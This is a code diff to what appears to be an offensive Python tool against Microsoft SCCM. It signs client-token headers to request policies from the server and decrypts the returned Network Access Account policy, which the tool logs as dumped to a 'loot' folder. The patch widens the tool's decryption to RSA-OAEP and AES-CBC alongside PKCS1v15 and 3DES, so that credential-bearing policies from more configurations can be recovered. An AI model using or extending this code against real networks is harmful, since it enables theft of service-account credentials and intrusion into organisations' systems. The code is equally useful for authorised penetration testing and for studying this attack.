@@ -9,7 +9,7 @@ from pyasn1.codec.der.decoder import decode
 from pyasn1_modules import rfc5652
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
+from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
@@ -144,7 +144,6 @@ class CryptoTools:
     @staticmethod
     def decrypt3Des(key, encryptedKey, iv, data):
         desKey = key.decrypt(encryptedKey, PKCS1v15())
-
         cipher = Cipher(TripleDES(desKey), modes.CBC(iv))
         decryptor = cipher.decryptor()
         return decryptor.update(data) + decryptor.finalize()
@@ -281,14 +280,15 @@ class SCCMTools():
         }
 
         if authHeaders == True:
-          headers["ClientToken"] = "GUID:{};{};2".format(
-            clientID, 
-            now.strftime(dateFormat1)
-          )
           #for manual retrieval
           if key:
               self.key = key
-          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+          current_time = datetime.datetime.utcnow().strftime(dateFormat1)
+          headers["ClientToken"] = "GUID:{};{};2".format(
+            clientID,
+            current_time
+          )
+          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, current_time).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
         r = requests.get(f"{self._serverURI}"+url, headers=headers)
         if retcontent == True:
           return r.content
@@ -387,10 +387,30 @@ class SCCMTools():
         content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
         content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
         encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
+        kt_algo_oid = str(content['recipientInfos'][0]['ktri']['keyEncryptionAlgorithm']['algorithm'])
+        algo_oid = str(content['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])
         iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
         body = content['encryptedContentInfo']['encryptedContent'].asOctets()
+        logger.debug(f"[*] Key transport: {kt_algo_oid}, Content encryption: {algo_oid}")
 
-        decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
+        # Determine RSA padding from key transport algorithm
+        if kt_algo_oid == '1.2.840.113549.1.1.7':  # RSA-OAEP
+            desKey = self.key.decrypt(encryptedRSAKey, OAEP(mgf=MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None))
+        else:  # PKCS1v15 (1.2.840.113549.1.1.1)
+            desKey = self.key.decrypt(encryptedRSAKey, PKCS1v15())
+
+        logger.debug(f"[*] Decrypted symmetric key: {len(desKey)} bytes ({len(desKey)*8}-bit)")
+
+        # Determine content encryption algorithm
+        if algo_oid == '2.16.840.1.101.3.4.1.42':  # AES-256-CBC
+            cipher = Cipher(algorithms.AES(desKey), modes.CBC(iv))
+        elif algo_oid == '2.16.840.1.101.3.4.1.2':  # AES-128-CBC
+            cipher = Cipher(algorithms.AES(desKey), modes.CBC(iv))
+        else:  # 3DES-CBC (1.2.840.113549.3.7)
+            cipher = Cipher(TripleDES(desKey), modes.CBC(iv))
+
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(body) + decryptor.finalize()
         policy = decrypted.decode('utf-16')
         return policy
     
@@ -577,8 +597,8 @@ class SCCMTools():
                     Tools.write_to_file(decryptedResult, file_name)
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
                     return True
-                except:
-                    logger.info(f"[-] Something went wrong.")
+                except Exception as e:
+                    logger.info(f"[-] Something went wrong: {e}")
         return False
                 
         
